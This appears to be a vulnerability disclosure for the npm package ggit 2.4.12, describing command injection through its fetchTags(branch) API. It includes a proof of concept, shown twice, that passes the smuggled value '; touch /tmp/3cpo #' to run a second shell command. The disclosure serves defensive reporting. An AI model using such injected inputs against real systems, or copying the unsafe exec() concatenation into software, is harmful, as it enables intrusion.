Command Injection vulnerability in `ggit@2.4.12`

 [Raw](/lirantal/d8f87b366d2078e6118ab7bf2b005f02/raw/deb309dafaa2aaca6cc63c6fd4958b4d26afd6bd/ggit-command-injection.md)

# Command Injection vulnerability in `ggit@2.4.12`

`ggit` describes itself as:

```
Local promise-returning git command wrappers

```

Resources:

* Project's GitHub source code: <https://github.com/bahmutov/ggit>
* Project's npm package: <https://www.npmjs.com/package/ggit>

## Background on exploitation

I'm reporting a Command Injection vulnerability in `ggit` npm package.

This vulnerability manifests with the library's `fetchTags(branch)` API,
which allows user input to specify the branch to be fetched and then concatenates
this string along with a git command which is then passed to the unsafe `exec()`
Node.js child process API.

## Exploit

1. Install `ggit@2.4.12` or earlier
2. Establish the following POC:

```
const fetchTags = require("ggit").fetchTags;
fetchTags("; touch /tmp/3cpo #").then(function () {
  // should be same as running command
  // git pull origin --tags
  console.log("done");
});
```

3. Observe new file created on disk at `/tmp/3cpo`

## How to fix?

There is no fixed version for `ggit`.

## Overview

Affected versions of this package are vulnerable to Command Injection via the `fetchTags(branch)` API, which allows user input to specify the branch to be fetched and then concatenates this string along with a git command which is then passed to the unsafe `exec()` Node.js child process API.

## PoC

```
const fetchTags = require("ggit").fetchTags;
fetchTags("; touch /tmp/3cpo #").then(function () {
  // should be same as running command
  // git pull origin --tags
  console.log("done");
});
